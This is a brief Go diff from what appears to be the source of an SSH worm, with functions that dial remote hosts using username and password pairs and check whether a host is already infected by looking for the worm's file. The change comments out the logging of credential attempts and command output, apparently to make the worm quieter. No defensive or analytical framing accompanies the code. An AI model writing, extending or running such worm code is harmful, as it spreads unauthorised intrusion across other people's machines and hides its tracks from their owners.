@@ -83,7 +83,7 @@ func OpenSSHConnection(ip string) (*ssh.Client, *ssh.Session) {
 	}
 	miss = false
 
-	log.Println("Connecting with pair:", "username:", username, "password:", password, "on ip:", ip)
+	//log.Println("Connecting with pair:", "username:", username, "password:", password, "on ip:", ip)
 	client, err := ssh.Dial("tcp",ip,config)
 	if err != nil {
 		log.Println("Failed to dial: ", err)
@@ -106,9 +106,9 @@ func SshCheckInfection(ip string) bool {
 	defer session.Close()
 
 	out, _ := session.CombinedOutput("if [ -f \"" + worm_dir + "/" + worm_filename + "\" ]; then echo \"hola\"; fi;")
-	log.Printf("Command output: %q", out)
+	//log.Printf("Command output: %q", out)
 	if len(out) != 0 {
-		log.Printf("Command output: %q", out)
+		//log.Printf("Command output: %q", out)
 		return true
 	}
 
